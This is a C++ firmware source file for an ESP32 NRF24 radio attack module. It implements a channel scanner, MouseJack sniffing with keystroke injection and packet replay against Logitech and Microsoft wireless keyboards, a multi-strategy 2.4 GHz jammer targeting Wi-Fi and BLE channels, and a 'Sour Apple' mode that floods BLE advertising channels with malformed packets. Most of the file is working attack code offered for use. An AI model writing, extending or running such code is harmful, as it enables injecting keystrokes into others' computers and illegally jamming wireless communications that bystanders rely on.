#include "nrf_module.h"

NRFModule nrfModule;

// ── Strategy name LUT ───────────────────────────────────────
static const char* _stratNames[] = {
    "Full Sweep", "Random Hop", "BLE Focus", "BLE Continuous",
    "WiFi Focus", "Targeted",  "Adaptive"
};

static const char* _modeNames[] = {
    "Scanner", "MouseJack", "Jammer", "Replay", "Sour Apple"
};

// WiFi channel center frequencies mapped to NRF24 channel ranges
// WiFi CH1  = 2412MHz -> NRF CH 12 (2400+12)
// WiFi CH6  = 2437MHz -> NRF CH 37
// WiFi CH11 = 2462MHz -> NRF CH 62
static const uint8_t _wifiCenterChannels[] = { 12, 37, 62 };
static const uint8_t _bleAdvChannels[]     = { NRF_BLE_CH37, NRF_BLE_CH38, NRF_BLE_CH39 };

// ════════════════════════════════════════════════════════════
//  Constructor
// ════════════════════════════════════════════════════════════
NRFModule::NRFModule() 
    : _initialized(false), _scanning(false), _mousejackRunning(false), 
      _jamming(false), _sourAppleRunning(false), _currentMode(NRF_MODE_SCAN), 
      _radio(NRF_CE_PIN, NRF_CSN_PIN), _channel(0), _lastHopMs(0), 
      _targetCount(0), _captureLen(0),
      _jamStrategy(JAM_FULL_SWEEP), _targetChannelCount(0),
      _adaptiveScanPhase(0)
{
    strcpy(_lastCapture, "Idle");
    memset(_channelActivity, 0, sizeof(_channelActivity));
    memset(_targets, 0, sizeof(_targets));
    memset(_captureBuf, 0, sizeof(_captureBuf));
    memset(_targetChannels, 0, sizeof(_targetChannels));

    // Default jammer config
    _jamConfig.burstCount   = NRF_JAM_BURST_COUNT;
    _jamConfig.dwellMs      = NRF_JAM_DWELL_MS;
    _jamConfig.channelStart = 0;
    _jamConfig.channelEnd   = 83;
    _jamConfig.paLevel      = RF24_PA_MAX;

    memset(&_jamStats, 0, sizeof(_jamStats));
}

// ════════════════════════════════════════════════════════════
//  Initialization
// ════════════════════════════════════════════════════════════
bool NRFModule::init() {
    Serial.println(F("[NRF] Initializing NRF24 Module..."));
    
    if (!_radio.begin()) {
        Serial.println(F("[NRF] Radio hardware is not responding!"));
        strcpy(_lastCapture, "HW Error");
        _initialized = false;
        return false;
    }
    
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setDataRate(RF24_2MBPS);
    _radio.setChannel(0);
    _radio.setAutoAck(false);
    _radio.disableCRC();
    _radio.setRetries(0, 0);        // No retries for max throughput
    _radio.setPayloadSize(32);
    
    Serial.println(F("[NRF] Initialized — All systems nominal"));
    _initialized = true;
    strcpy(_lastCapture, "Ready");
    return true;
}

// ════════════════════════════════════════════════════════════
//  Mode Management
// ════════════════════════════════════════════════════════════
void NRFModule::setMode(NRFMode mode) {
    _currentMode = mode;
}

NRFMode NRFModule::getMode() const {
    return _currentMode;
}

const char* NRFModule::getModeName() const {
    if (_currentMode < NRF_MODE_COUNT) return _modeNames[_currentMode];
    return "Unknown";
}

const char* NRFModule::getStrategyName() const {
    if (_jamStrategy < JAM_STRATEGY_COUNT) return _stratNames[_jamStrategy];
    return "Unknown";
}

// ════════════════════════════════════════════════════════════
//  Scanner — RPD-based Channel Activity Detection
// ════════════════════════════════════════════════════════════
void NRFModule::startScan() {
    if (!_initialized) return;
    _scanning = true;
    _mousejackRunning = false;
    _jamming = false;
    _sourAppleRunning = false;
    _currentMode = NRF_MODE_SCAN;
    _channel = 0;
    _lastHopMs = millis();
    memset(_channelActivity, 0, sizeof(_channelActivity));
    
    _radio.setAddressWidth(5);
    _radio.setAutoAck(false);
    _radio.disableCRC();
    _radio.setDataRate(RF24_2MBPS);
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setPayloadSize(32);
    _radio.setChannel(0);
    uint8_t rxAddr[] = { 0xAA, 0x55, 0xAA, 0x55, 0xAA };
    _radio.openReadingPipe(1, rxAddr);
    _radio.startListening();
    
    strcpy(_lastCapture, "Scanning CH: 0");
    Serial.println(F("[NRF] Advanced Scan Started — RPD active"));
}

void NRFModule::stopScan() {
    _scanning = false;
    _radio.stopListening();
    strcpy(_lastCapture, "Scan Stopped");
    Serial.println(F("[NRF] Scan Stopped"));
}

bool NRFModule::isScanning() const { return _scanning; }

uint8_t NRFModule::getChannelActivity(uint8_t ch) const {
    if (ch > 83) return 0;
    return _channelActivity[ch];
}

void NRFModule::_runScan() {
    unsigned long now = millis();

    // Check RPD (Received Power Detector) for signal presence
    if (_radio.testRPD()) {
        if (_channelActivity[_channel] < 255)
            _channelActivity[_channel]++;
    }

    // Read any available data
    if (_radio.available()) {
        uint8_t buffer[32];
        _radio.read(&buffer, sizeof(buffer));
        snprintf(_lastCapture, sizeof(_lastCapture), "CH%02d:%02X%02X%02X%02X RPD:%d", 
                 _channel, buffer[0], buffer[1], buffer[2], buffer[3],
                 _channelActivity[_channel]);
    }

    // Hop channel
    if (now - _lastHopMs > NRF_SCAN_HOP_MS) {
        _channel++;
        if (_channel > 83) _channel = 0;
        _radio.setChannel(_channel);
        _radio.startListening();  // Restart listening to reset RPD
        _lastHopMs = now;

        if (strncmp(_lastCapture, "Scanning", 8) == 0 || strcmp(_lastCapture, "Idle") == 0) {
            snprintf(_lastCapture, sizeof(_lastCapture), "Scanning CH: %d", _channel);
        }
    }
}

// ════════════════════════════════════════════════════════════
//  MouseJack — Advanced Sniffing + Injection + Replay
// ════════════════════════════════════════════════════════════
void NRFModule::startMouseJack() {
    if (!_initialized) return;
    _mousejackRunning = true;
    _scanning = false;
    _jamming = false;
    _sourAppleRunning = false;
    _currentMode = NRF_MODE_MOUSEJACK;
    _targetCount = 0;
    _channel = 2;

    _radio.stopListening();
    _radio.setAutoAck(false);
    _radio.disableCRC();
    _radio.setDataRate(RF24_2MBPS);
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setAddressWidth(3);
    _radio.setPayloadSize(32);
    
    // Promiscuous preamble addresses for Logitech/Microsoft
    _radio.openReadingPipe(0, (uint64_t)0x00AA);
    _radio.openReadingPipe(1, (uint64_t)0x0055);
    _radio.startListening();

    strcpy(_lastCapture, "MouseJack Active");
    Serial.println(F("[NRF] MouseJack Sniffer Started — Hunting targets"));
}

void NRFModule::stopMouseJack() {
    _mousejackRunning = false;
    _radio.stopListening();
    strcpy(_lastCapture, "MouseJack Stopped");
    Serial.println(F("[NRF] MouseJack Stopped"));
}

bool NRFModule::isMouseJackRunning() const { return _mousejackRunning; }
int  NRFModule::getTargetCount() const     { return _targetCount; }

MouseJackTarget* NRFModule::getTarget(int index) {
    if (index >= 0 && index < _targetCount) return &_targets[index];
    return nullptr;
}

MouseJackDeviceType NRFModule::_identifyDevice(const uint8_t* payload, uint8_t len) {
    if (len < 4) return MJ_DEVICE_UNKNOWN;
    
    // Logitech Unifying: typically starts with 0x00 0x40 or 0x00 0xC2
    if (payload[0] == 0x00 && (payload[1] == 0x40 || payload[1] == 0xC2 || payload[1] == 0x4F)) {
        return MJ_DEVICE_LOGITECH;
    }
    // Microsoft: often has 0x08 or 0x0A frame type
    if (payload[0] == 0x08 || payload[0] == 0x0A) {
        return MJ_DEVICE_MICROSOFT;
    }
    // Generic HID-like patterns
    if (len >= 8 && payload[0] != 0xFF && payload[0] != 0x00) {
        return MJ_DEVICE_GENERIC_HID;
    }
    return MJ_DEVICE_UNKNOWN;
}

void NRFModule::_sniffMouseJack() {
    if (_radio.available()) {
        uint8_t buf[32];
        uint8_t pipeNum = 0;
        _radio.read(&buf, sizeof(buf));

        // Validate: not all zeros or all FFs
        bool allZero = true, allFF = true;
        for (int i = 0; i < 6; i++) {
            if (buf[i] != 0x00) allZero = false;
            if (buf[i] != 0xFF) allFF = false;
        }
        
        if (!allZero && !allFF) {
            MouseJackDeviceType devType = _identifyDevice(buf, 32);
            const char* devName = "Unknown Device";
            if (devType == MJ_DEVICE_LOGITECH)    devName = "Logitech Unifying";
            else if (devType == MJ_DEVICE_MICROSOFT) devName = "Microsoft Wireless";
            else if (devType == MJ_DEVICE_GENERIC_HID) devName = "Generic HID";
            
            snprintf(_lastCapture, sizeof(_lastCapture), "%02X:%02X:%02X:%02X:%02X CH%02d", 
                     buf[0], buf[1], buf[2], buf[3], buf[4], _channel);

            // Check if target already registered
            bool found = false;
            for (int i = 0; i < _targetCount; i++) {
                if (memcmp(_targets[i].address, buf, 5) == 0) {
                    _targets[i].lastSeen = millis();
                    _targets[i].packetCount++;
                    _targets[i].channel = _channel;
                    // Update last payload
                    memcpy(_targets[i].lastPayload, buf, 32);
                    _targets[i].lastPayloadLen = 32;
                    found = true;
                    break;
                }
            }
            
            if (!found && _targetCount < NRF_MAX_TARGETS) {
                MouseJackTarget& t = _targets[_targetCount];
                memcpy(t.address, buf, 5);
                t.channel    = _channel;
                t.lastSeen   = millis();
                t.deviceType = devType;
                t.rssi       = _radio.testRPD() ? -40 : -80;  // Rough estimate
                t.packetCount = 1;
                memcpy(t.lastPayload, buf, 32);
                t.lastPayloadLen = 32;
                strncpy(t.name, devName, sizeof(t.name) - 1);
                t.name[sizeof(t.name) - 1] = '\0';
                _targetCount++;
                
                Serial.printf("[NRF] New target #%d: %s on CH%d\n", _targetCount, devName, _channel);
            }
            
            // Save to capture buffer (rolling)
            uint8_t copyLen = min((uint8_t)32, (uint8_t)(NRF_CAPTURE_BUF_SIZE - _captureLen));
            if (copyLen > 0) {
                memcpy(_captureBuf + _captureLen, buf, copyLen);
                _captureLen += copyLen;
            }
        }
    }

    // Fast channel hopping across Logitech/Microsoft bands
    if (millis() - _lastHopMs > NRF_MOUSEJACK_HOP_MS) {
        _lastHopMs = millis();
        
        // Weighted hopping: spend more time on channels where targets were found
        bool hoppedToTarget = false;
        if (_targetCount > 0 && (random(100) < 40)) {
            // 40% chance to revisit a known target channel
            int idx = random(_targetCount);
            _channel = _targets[idx].channel;
            hoppedToTarget = true;
        }
        
        if (!hoppedToTarget) {
            _channel += 3;  // Standard 3-channel hop for Logitech Unifying
            if (_channel > 80) _channel = 2;
        }
        
        _radio.setChannel(_channel);
    }
}

// ── Keystroke Injection ─────────────────────────────────────
void NRFModule::injectKeystroke(int targetIdx, uint8_t key, uint8_t mod) {
    if (!_initialized || targetIdx < 0 || targetIdx >= _targetCount) return;
    
    MouseJackTarget& t = _targets[targetIdx];
    
    _radio.stopListening();
    _radio.setAddressWidth(5);
    _radio.openWritingPipe(t.address);
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setChannel(t.channel);
    
    // HID keyboard report: [modifier, reserved, key1, key2, key3, key4, key5, key6]
    uint8_t hidReport[32] = {0};
    
    if (t.deviceType == MJ_DEVICE_LOGITECH) {
        // Logitech Unifying encrypted keystroke frame
        hidReport[0] = 0x00;  // Report type
        hidReport[1] = 0xC1;  // Keystroke frame
        hidReport[2] = mod;   // Modifier
        hidReport[3] = 0x00;  // Reserved
        hidReport[4] = key;   // Key code
        hidReport[9] = 0x00;  // Checksum placeholder
    } else {
        // Generic HID report
        hidReport[0] = mod;
        hidReport[1] = 0x00;
        hidReport[2] = key;
    }
    
    // Send keystroke burst
    for (int i = 0; i < 5; i++) {
        _radio.writeFast(&hidReport, sizeof(hidReport));
    }
    _radio.txStandBy();
    
    // Send key release
    memset(hidReport, 0, sizeof(hidReport));
    if (t.deviceType == MJ_DEVICE_LOGITECH) {
        hidReport[0] = 0x00;
        hidReport[1] = 0xC1;
    }
    for (int i = 0; i < 3; i++) {
        _radio.writeFast(&hidReport, sizeof(hidReport));
    }
    _radio.txStandBy();
    
    // Restore listening mode
    _radio.setAddressWidth(3);
    _radio.openReadingPipe(0, (uint64_t)0x00AA);
    _radio.openReadingPipe(1, (uint64_t)0x0055);
    _radio.startListening();
    
    snprintf(_lastCapture, sizeof(_lastCapture), "Injected key:0x%02X->T%d", key, targetIdx);
    Serial.printf("[NRF] Injected key 0x%02X (mod 0x%02X) to target %d\n", key, mod, targetIdx);
}

// ── Packet Replay ───────────────────────────────────────────
void NRFModule::replayCapture(int targetIdx) {
    if (!_initialized || targetIdx < 0 || targetIdx >= _targetCount) return;
    
    MouseJackTarget& t = _targets[targetIdx];
    if (t.lastPayloadLen == 0) return;
    
    _radio.stopListening();
    _radio.setAddressWidth(5);
    _radio.openWritingPipe(t.address);
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setChannel(t.channel);
    
    // Replay last captured payload multiple times
    for (int i = 0; i < 10; i++) {
        _radio.writeFast(t.lastPayload, t.lastPayloadLen);
    }
    _radio.txStandBy();
    
    // Restore listening
    _radio.setAddressWidth(3);
    _radio.openReadingPipe(0, (uint64_t)0x00AA);
    _radio.openReadingPipe(1, (uint64_t)0x0055);
    _radio.startListening();
    
    snprintf(_lastCapture, sizeof(_lastCapture), "Replayed %dB->T%d", t.lastPayloadLen, targetIdx);
    Serial.printf("[NRF] Replayed %d bytes to target %d on CH%d\n", t.lastPayloadLen, targetIdx, t.channel);
}

// ════════════════════════════════════════════════════════════
//  RF Jammer — 6 Strategies, Burst Engine, HW RNG Noise
// ════════════════════════════════════════════════════════════
void NRFModule::startJammer() {
    if (!_initialized) return;
    _jamming = true;
    _scanning = false;
    _mousejackRunning = false;
    _sourAppleRunning = false;
    _currentMode = NRF_MODE_JAMMER;
    _channel = _jamConfig.channelStart;

    _radio.stopListening();
    _radio.setAddressWidth(5);
    _radio.setPALevel((rf24_pa_dbm_e)_jamConfig.paLevel);
    
    // BLE uses 1Mbps GFSK; match rate to maximize energy in BLE receiver filter
    if (_jamStrategy == JAM_BLE_FOCUSED || _jamStrategy == JAM_BLE_CONTINUOUS) {
        _radio.setDataRate(RF24_1MBPS);
    } else {
        _radio.setDataRate(RF24_2MBPS);
    }
    
    _radio.setAutoAck(false);
    _radio.disableCRC();
    _radio.setRetries(0, 0);
    _radio.setPayloadSize(32);
    
    // Open a wide writing pipe for noise
    uint8_t jamAddr[] = { 0xAA, 0x55, 0xAA, 0x55, 0xAA };
    _radio.openWritingPipe(jamAddr);

    // Reset stats
    _jamStats.packetsSent     = 0;
    _jamStats.channelsCovered = 0;
    _jamStats.startTimeMs     = millis();
    _jamStats.currentChannel  = _channel;
    _jamStats.strategy        = _jamStrategy;

    // For adaptive mode, start in scan phase
    if (_jamStrategy == JAM_ADAPTIVE) {
        _adaptiveScanPhase = 0;
        _targetChannelCount = 0;
    }

    snprintf(_lastCapture, sizeof(_lastCapture), "JAM:%s", getStrategyName());
    Serial.printf("[NRF] Jammer Started — Strategy: %s, Burst: %d\n", 
                  getStrategyName(), _jamConfig.burstCount);
}

void NRFModule::stopJammer() {
    _jamming = false;
    _radio.stopListening();
    
    unsigned long runtime = (millis() - _jamStats.startTimeMs) / 1000;
    snprintf(_lastCapture, sizeof(_lastCapture), "Jam Stop %lupkts %lus", 
             (unsigned long)_jamStats.packetsSent, runtime);
    Serial.printf("[NRF] Jammer Stopped — %lu packets in %lu seconds\n", 
                  (unsigned long)_jamStats.packetsSent, runtime);
}

bool NRFModule::isJamming() const { return _jamming; }

void NRFModule::setJammerStrategy(JammerStrategy strat) {
    _jamStrategy = strat;
    if (_jamming) {
        // Dynamically switch data rate to match strategy
        if (_jamStrategy == JAM_BLE_FOCUSED || _jamStrategy == JAM_BLE_CONTINUOUS) {
            _radio.setDataRate(RF24_1MBPS);
        } else {
            _radio.setDataRate(RF24_2MBPS);
        }
        _jamStats.strategy = strat;
        snprintf(_lastCapture, sizeof(_lastCapture), "JAM:%s", getStrategyName());
        Serial.printf("[NRF] Strategy changed to: %s\n", getStrategyName());
    }
}

JammerStrategy NRFModule::getJammerStrategy() const { return _jamStrategy; }

void NRFModule::setJammerConfig(JammerConfig cfg) {
    _jamConfig = cfg;
    if (cfg.burstCount < 3)  _jamConfig.burstCount = 3;
    if (cfg.burstCount > 15) _jamConfig.burstCount = 15;
    if (cfg.channelEnd > 83) _jamConfig.channelEnd = 83;
}

const JammerStats& NRFModule::getJammerStats() const { return _jamStats; }

void NRFModule::setTargetChannel(uint8_t ch) {
    if (_targetChannelCount < 8 && ch <= 83) {
        _targetChannels[_targetChannelCount++] = ch;
    }
}

// ── Noise Generation — Hardware RNG ─────────────────────────
void NRFModule::_generateNoise(uint8_t* buf, uint8_t len) {
    // Use ESP32 hardware random number generator for true randomness
    // Rotate between noise patterns to defeat adaptive filtering
    uint8_t pattern = esp_random() & 0x03;
    
    switch (pattern) {
        case 0:  // Pure random — impossible to predict/filter
            for (uint8_t i = 0; i < len; i += 4) {
                uint32_t r = esp_random();
                uint8_t copyLen = min((uint8_t)4, (uint8_t)(len - i));
                memcpy(buf + i, &r, copyLen);
            }
            break;
            
        case 1:  // Alternating pattern — high spectral energy
            for (uint8_t i = 0; i < len; i++) {
                buf[i] = (i & 1) ? 0x55 : 0xAA;
            }
            // Inject random bytes to prevent filtering
            buf[esp_random() % len] = esp_random() & 0xFF;
            buf[esp_random() % len] = esp_random() & 0xFF;
            break;
            
        case 2:  // All ones — maximum power density
            memset(buf, 0xFF, len);
            break;
            
        case 3:  // Structured fake packet — looks like real traffic
        {
            uint32_t r1 = esp_random(), r2 = esp_random();
            buf[0] = 0x00;  // Preamble-like
            buf[1] = (r1 >> 8) & 0xFF;
            buf[2] = (r1 >> 16) & 0xFF;
            buf[3] = (r1 >> 24) & 0xFF;
            for (uint8_t i = 4; i < len; i += 4) {
                uint32_t r = esp_random();
                uint8_t copyLen = min((uint8_t)4, (uint8_t)(len - i));
                memcpy(buf + i, &r, copyLen);
            }
            break;
        }
    }
}

// ── Burst Engine — Multi-packet per channel ─────────────────
void NRFModule::_burstChannel(uint8_t ch) {
    _radio.setChannel(ch);
    _jamStats.currentChannel = ch;
    
    // Variable payload sizes to disrupt different protocol layers
    static const uint8_t payloadSizes[] = { 32, 24, 16, 8, 32 };
    
    for (uint8_t burst = 0; burst < _jamConfig.burstCount; burst++) {
        uint8_t noise[32];
        uint8_t pktSize = payloadSizes[burst % 5];
        _generateNoise(noise, pktSize);
        _radio.writeFast(noise, pktSize);
        _jamStats.packetsSent++;
    }
    // Flush all buffered packets
    _radio.txStandBy();
    
    // Optional dwell time for sustained interference
    if (_jamConfig.dwellMs > 0) {
        delay(_jamConfig.dwellMs);
    }
    
    _jamStats.channelsCovered++;
}

// ── Strategy: Full Sweep ────────────────────────────────────
void NRFModule::_jamFullSweep() {
    _burstChannel(_channel);
    _channel++;
    if (_channel > _jamConfig.channelEnd) _channel = _jamConfig.channelStart;
}

// ── Strategy: Random Hop ────────────────────────────────────
void NRFModule::_jamRandomHop() {
    uint8_t range = _jamConfig.channelEnd - _jamConfig.channelStart + 1;
    _channel = _jamConfig.channelStart + (esp_random() % range);
    _burstChannel(_channel);
}

// ── Strategy: BLE Focused ───────────────────────────────────
void NRFModule::_jamBLEFocused() {
    // 70% of time on BLE advertising channels, 30% random
    if (esp_random() % 10 < 7) {
        uint8_t bleIdx = esp_random() % 3;
        uint8_t bleCh = _bleAdvChannels[bleIdx];
        // Extra burst density on BLE channels (2x normal)
        uint8_t savedBurst = _jamConfig.burstCount;
        _jamConfig.burstCount = min((uint8_t)15, (uint8_t)(savedBurst * 2));
        _burstChannel(bleCh);
        _jamConfig.burstCount = savedBurst;
    } else {
        uint8_t range = _jamConfig.channelEnd - _jamConfig.channelStart + 1;
        _channel = _jamConfig.channelStart + (esp_random() % range);
        _burstChannel(_channel);
    }
}

// ── Strategy: BLE Continuous ────────────────────────────────
void NRFModule::_jamBLEContinuous() {
    // Blast continuous interference on BLE advertising channels (2, 26, 80)
    uint8_t bleIdx = esp_random() % 3;
    uint8_t ch = _bleAdvChannels[bleIdx];
    _radio.setChannel(ch);
    _jamStats.currentChannel = ch;
    
    // BLE Advertising Access Address: 0x8E89BED6 -> D6 BE 89 8E (Little Endian)
    uint8_t pkt[32];
    pkt[0] = 0xD6;
    pkt[1] = 0xBE;
    pkt[2] = 0x89;
    pkt[3] = 0x8E;
    
    for (int i = 4; i < 32; i += 4) {
        uint32_t r = esp_random();
        memcpy(pkt + i, &r, min((size_t)4, sizeof(pkt) - i));
    }
    
    for (uint8_t burst = 0; burst < _jamConfig.burstCount; burst++) {
        _radio.writeFast(pkt, 32);
        _jamStats.packetsSent++;
    }
    _radio.txStandBy();
    if (_jamConfig.dwellMs > 0) {
        delay(_jamConfig.dwellMs);
    }
    _jamStats.channelsCovered++;
}

// ── Strategy: WiFi Focused ──────────────────────────────────
void NRFModule::_jamWiFiFocused() {
    // Target WiFi channels 1, 6, 11 center frequencies ± 10 MHz spread
    if (esp_random() % 10 < 8) {
        uint8_t wifiIdx = esp_random() % 3;
        uint8_t center = _wifiCenterChannels[wifiIdx];
        // Sweep ±10 channels around center (20MHz bandwidth)
        int8_t offset = (int8_t)(esp_random() % 21) - 10;
        uint8_t ch = constrain((int)center + offset, 0, 83);
        _burstChannel(ch);
    } else {
        uint8_t range = _jamConfig.channelEnd - _jamConfig.channelStart + 1;
        _channel = _jamConfig.channelStart + (esp_random() % range);
        _burstChannel(_channel);
    }
}

// ── Strategy: Targeted ──────────────────────────────────────
void NRFModule::_jamTargeted() {
    if (_targetChannelCount == 0) {
        // Fallback to full sweep if no targets
        _jamFullSweep();
        return;
    }
    
    // Cycle through target channels with maximum burst density
    static uint8_t tIdx = 0;
    uint8_t savedBurst = _jamConfig.burstCount;
    _jamConfig.burstCount = min((uint8_t)15, (uint8_t)(savedBurst * 2));
    
    _burstChannel(_targetChannels[tIdx % _targetChannelCount]);
    tIdx++;
    
    _jamConfig.burstCount = savedBurst;
    
    // Occasionally sweep other channels (10% of time)
    if (esp_random() % 10 == 0) {
        _channel = esp_random() % 84;
        _burstChannel(_channel);
    }
}

// ── Strategy: Adaptive ──────────────────────────────────────
void NRFModule::_jamAdaptive() {
    if (_adaptiveScanPhase == 0) {
        // Phase 0: Quick scan to find active channels
        _radio.setChannel(_channel);
        _radio.startListening();
        delayMicroseconds(500);  // Brief listen
        
        if (_radio.testRPD()) {
            // Channel has activity — mark it
            if (_targetChannelCount < 8) {
                bool exists = false;
                for (uint8_t i = 0; i < _targetChannelCount; i++) {
                    if (_targetChannels[i] == _channel) { exists = true; break; }
                }
                if (!exists) {
                    _targetChannels[_targetChannelCount++] = _channel;
                    Serial.printf("[NRF] Adaptive: Active CH%d detected\n", _channel);
                }
            }
        }
        
        _radio.stopListening();
        _channel++;
        if (_channel > 83) {
            // Scan complete — switch to jam phase
            _channel = 0;
            if (_targetChannelCount > 0) {
                _adaptiveScanPhase = 1;
                snprintf(_lastCapture, sizeof(_lastCapture), "Adapt:%d targets", _targetChannelCount);
                Serial.printf("[NRF] Adaptive: Scan done, %d active channels found\n", _targetChannelCount);
            } else {
                // No activity found — rescan
                snprintf(_lastCapture, sizeof(_lastCapture), "Adapt:Rescanning");
            }
        }
    } else {
        // Phase 1: Jam detected channels
        static uint8_t jamIdx = 0;
        static uint16_t jamCycles = 0;
        
        _burstChannel(_targetChannels[jamIdx % _targetChannelCount]);
        jamIdx++;
        jamCycles++;
        
        // Re-scan every ~500 jam cycles to adapt to changing environment
        if (jamCycles > 500) {
            jamCycles = 0;
            _adaptiveScanPhase = 0;
            _targetChannelCount = 0;
            _channel = 0;
            snprintf(_lastCapture, sizeof(_lastCapture), "Adapt:Rescanning");
        }
    }
}

// ── Jammer Router ───────────────────────────────────────────
void NRFModule::_runJammer() {
    switch (_jamStrategy) {
        case JAM_FULL_SWEEP:     _jamFullSweep();     break;
        case JAM_RANDOM_HOP:     _jamRandomHop();     break;
        case JAM_BLE_FOCUSED:    _jamBLEFocused();    break;
        case JAM_BLE_CONTINUOUS: _jamBLEContinuous(); break;
        case JAM_WIFI_FOCUSED:   _jamWiFiFocused();   break;
        case JAM_TARGETED:       _jamTargeted();      break;
        case JAM_ADAPTIVE:       _jamAdaptive();      break;
        default:                 _jamFullSweep();     break;
    }
    
    // Update status periodically
    static unsigned long lastStatusMs = 0;
    if (millis() - lastStatusMs > 500) {
        lastStatusMs = millis();
        unsigned long elapsed = (millis() - _jamStats.startTimeMs) / 1000;
        snprintf(_lastCapture, sizeof(_lastCapture), "%s CH%02d %lupkt", 
                 getStrategyName(), _jamStats.currentChannel, 
                 (unsigned long)_jamStats.packetsSent);
    }
}

// ════════════════════════════════════════════════════════════
//  Sour Apple — BLE Disruption via NRF24 Raw RF
// ════════════════════════════════════════════════════════════
void NRFModule::startSourApple() {
    if (!_initialized) return;
    _sourAppleRunning = true;
    _scanning = false;
    _mousejackRunning = false;
    _jamming = false;
    _currentMode = NRF_MODE_SOUR_APPLE;

    _radio.stopListening();
    _radio.setPALevel(RF24_PA_MAX);
    _radio.setDataRate(RF24_1MBPS);  // BLE uses 1Mbps
    _radio.setAutoAck(false);
    _radio.disableCRC();
    _radio.setRetries(0, 0);
    _radio.setPayloadSize(32);
    _radio.setAddressWidth(4);
    uint8_t bleAddr[] = { 0xD6, 0xBE, 0x89, 0x8E };
    _radio.openWritingPipe(bleAddr);

    strcpy(_lastCapture, "Sour Apple Active");
    Serial.println(F("[NRF] Sour Apple Started — BLE disruption via NRF24"));
}

void NRFModule::stopSourApple() {
    _sourAppleRunning = false;
    _radio.stopListening();
    strcpy(_lastCapture, "Sour Apple Stopped");
    Serial.println(F("[NRF] Sour Apple Stopped"));
}

bool NRFModule::isSourAppleRunning() const { return _sourAppleRunning; }

void NRFModule::_runSourApple() {
    // Blast malformed BLE-like advertising packets on BLE channels
    // BLE advertising channels map to NRF channels 2, 26, 80
    static uint8_t bleIdx = 0;
    uint8_t ch = _bleAdvChannels[bleIdx % 3];
    bleIdx++;
    
    _radio.setChannel(ch);
    
    // Construct fake BLE advertising PDU-like payloads
    for (int burst = 0; burst < 8; burst++) {
        uint8_t pkt[32];
        uint32_t r1 = esp_random(), r2 = esp_random();
        
        // BLE-like header: ADV_IND PDU type
        pkt[0] = 0x40 | (esp_random() & 0x0F);  // PDU type + random flags
        pkt[1] = 0x06 + (esp_random() % 20);     // Length
        // Random "address"
        pkt[2] = r1 & 0xFF;
        pkt[3] = (r1 >> 8) & 0xFF;
        pkt[4] = (r1 >> 16) & 0xFF;
        pkt[5] = (r1 >> 24) & 0xFF;
        pkt[6] = r2 & 0xFF;
        pkt[7] = (r2 >> 8) & 0xFF;
        // Random advertising data
        for (int i = 8; i < 32; i += 4) {
            uint32_t r = esp_random();
            memcpy(pkt + i, &r, min(4, 32 - i));
        }
        
        _radio.writeFast(pkt, 32);
    }
    _radio.txStandBy();
    
    // Update status
    static unsigned long lastStatusMs = 0;
    if (millis() - lastStatusMs > 300) {
        lastStatusMs = millis();
        snprintf(_lastCapture, sizeof(_lastCapture), "SourApple BLE-CH%d blasting", ch);
    }
}

// ════════════════════════════════════════════════════════════
//  Main Update Loop
// ════════════════════════════════════════════════════════════
void NRFModule::update() {
    if (!_initialized) return;

    if (_mousejackRunning) {
        _sniffMouseJack();
        return;
    }

    if (_jamming) {
        _runJammer();
        return;
    }

    if (_sourAppleRunning) {
        _runSourApple();
        return;
    }

    if (_scanning) {
        _runScan();
        return;
    }
}

const char* NRFModule::getLastCaptured() const { return _lastCapture; }
